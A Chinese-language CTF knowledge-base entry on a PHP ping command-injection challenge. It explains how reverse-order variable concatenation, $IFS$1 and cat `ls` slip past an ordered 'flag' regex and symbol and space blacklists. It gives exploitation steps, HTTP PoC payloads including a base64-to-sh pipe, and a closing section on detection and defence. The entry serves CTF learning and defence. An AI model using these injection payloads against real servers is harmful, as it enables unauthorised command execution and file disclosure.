---
id: ctf-web-ordered-flag-regex-concat-reorder-bypass
title: 有序关键字正则 + 符号/空格/bash 多重过滤的组合绕过：反序拼接变量 + $IFS$1 + cat `ls` 全目录读取
type: scenario
domain: ctf
path: ctf/web
technique: ordered-regex-concat-reorder-bypass
aliases:
- Ping Ping Ping
- f.*l.*a.*g 正则绕过
- 反序拼接绕过 flag 过滤
- cat `ls` 读取全目录
- 命令注入组合过滤绕过
tags:
- ctf
- web
- command-injection
- waf-bypass
- regex
- concat
- glob
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V526
  verified_at: '2026-11-11T14:58:59+08:00'
  notes: 已对照原文与图39-53核对：index.php过滤源码(图48)、直接cat$IFS$9flag.php被拦(图47)、正常次序a=fl;b=ag;cat$IFS$9$a$b.php被拦(图50)、反序a=ag;b=fl;cat$IFS$1$b$a.php读出flag(图49)、base64兜底(图51)、cat$IFS`ls`全目录读取(图52)均与PoC一致。已修正『正常次序失败尝试』描述并注明本题\x00-\x1f控制字符已被过滤。未验证点：原靶场未复现。
---

## 一句话结论

当命令注入防护同时拦截符号、空格、`bash` 与有序关键字正则 `.*f.*l.*a.*g.*` 时，可以把 `flag` 拆成 `fl` 和 `ag` 两段变量并按反序拼接（`a=ag;b=fl;...$b$a`），使原文不出现 f→l→a→g 的有序子序列，再用 `$IFS$1` 代替空格，即可读取 `flag.php`；或直接用 `cat$IFS\`ls\`` 读取当前目录全部文件，完全避开 `flag` 字面量。

## 原理

- **有序正则只匹配字面顺序**：`preg_match('/.*f.*l.*a.*g.*/', $ip)` 要求输入字符串中存在 `f` 在 `l` 前、`l` 在 `a` 前、`a` 在 `g` 前的子序列。把片段按 `a=ag;b=fl;` 反序声明后，原文里 `ag` 出现在 `fl` 之前，不满足 f→l→a→g 顺序；而变量展开后的命令仍是 `cat flag.php`。
- **空格过滤用 `$IFS$1` 绕过**：`$IFS` 是默认字段分隔符，`$1` 为空，二者相邻展开后充当空格；原文不含空格字符。
- **符号黑名单有缺口**：该过滤器正则覆盖 `& / ? * < > ' " \ ( ) [ ] { }` 与控制字符，但没有拦截 `;` 与 `|`，因此命令分隔仍可用；若连 `;`/`|` 也被拦，可改用换行等其它命令分隔符（需确认控制字符 `\x00-\x1f` 未被过滤；本题该范围已被覆盖）。
- **不命名目标文件**：`cat$IFS\`ls\`` 先用反引号执行 `ls` 取得目录下所有文件名，作为 `cat` 的参数；即使 `flag` 关键字被全匹配拦截，也不需要输入文件名，直接读出目录中所有文件内容。
- **编码兜底**：base64 方案 `echo$IFS$9<base64>|base64$IFS$9-d|sh` 把 `cat$IFS$9flag.php` 编码后执行，原文不含 `flag`/空格/被禁符号。
- 该题的失败尝试（直接 `cat$IFS$9flag.php`，图47；以及正常次序拼接 `a=fl;b=ag;cat$IFS$9$a$b.php`，图50）都会命中 `flag` 正则返回 `fxck your flag!`，正好反证「顺序」是关键。

## 触发条件

- 注入点把参数拼进 `shell_exec("ping -c 4 ".$ip)` 一类的命令。
- 过滤同时包含：符号黑名单（但可能漏掉 `;`/`|`）、空格黑名单、`bash` 关键字、有序关键字正则。
- 目标目录中存在需要读取的文件（如 `flag.php`），且 Web 用户可读。
- shell 为 sh/bash，支持变量赋值、`$IFS` 与反引号命令替换。

## 利用步骤

1. 确认注入分隔符：`|`、`;` 等未被过滤时优先使用；观察报错信息区分「符号过滤」「空格过滤」「关键字过滤」。
2. 尝试直接 `;cat$IFS$9flag.php`——若返回关键字拦截，说明存在 `flag` 关键字过滤。
3. 拆分关键字并反序声明：`1;a=ag;b=fl;cat$IFS$1$b$a.php`，验证是否读出文件。
4. 若仍被拦，改用不出现关键字的方案：`;cat$IFS\`ls\`` 或 base64 编码整条命令交给 `sh`。
5. 保存成功请求与回显作为证据；CTF 中读出 flag 即止。

## PoC

```http
GET /?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php HTTP/1.1
Host: target
```

```http
GET /?ip=;cat$IFS`ls` HTTP/1.1
Host: target
```

base64 兜底（`cat$IFS$9flag.php` 的 Base64 为 `Y2F0JElGUyQ5ZmxhZy5waHA=`）：

```http
GET /?ip=|echo$IFS$9Y2F0JElGUyQ5ZmxhZy5waHA=|base64$IFS$9-d|sh HTTP/1.1
Host: target
```

以上 PoC 未在目标环境执行，仅按原题过滤逻辑整理。

## 变体与关联

- 变体：有序正则换成 `flag` 普通子串时，可直接用变量拼接或通配符（`fl*`）绕过。
- 变体：`cat\`ls\`` 可换成 `tac\`ls\``、`sort\`ls\`` 等；目录文件中若含二进制/源码，先 `ls` 确认目标。
- 关联：[[web-php-rce-command-name-blacklist-equivalent-rewrites]]（命令名等价改写总览）、[[web-php-rce-command-injection-space-slash-filter-bypass]]（空格/斜杠绕过）、[[web-php-rce-shell-exec-quote-concat-glob-flag]]（引号+glob 黑名单绕过）。
- 边界：若过滤器用 `escapeshellarg` 或严格白名单，变量拼接与反引号都会被转义/拒绝；若 `$` 也被过滤，需改用不含变量的重定向/花括号方案。

## 检测与防御

- 防御：不要依赖关键字黑名单；对 IP 类参数用 `filter_var(..., FILTER_VALIDATE_IP)` 严格校验后再拼接，或使用参数化执行（`proc_open` 数组形式）。
- 防御：过滤 `$`、反引号、分号、管道等所有 shell 元字符只是缓解，根本方案是避免 shell 拼接。
- 检测：请求中出现变量赋值后拼接（`a=...;b=...`）、`$IFS`、反引号包裹 `ls`、base64 解码管道等特征；命令日志中出现 `ping -c 4 1;a=ag...` 等异常参数。
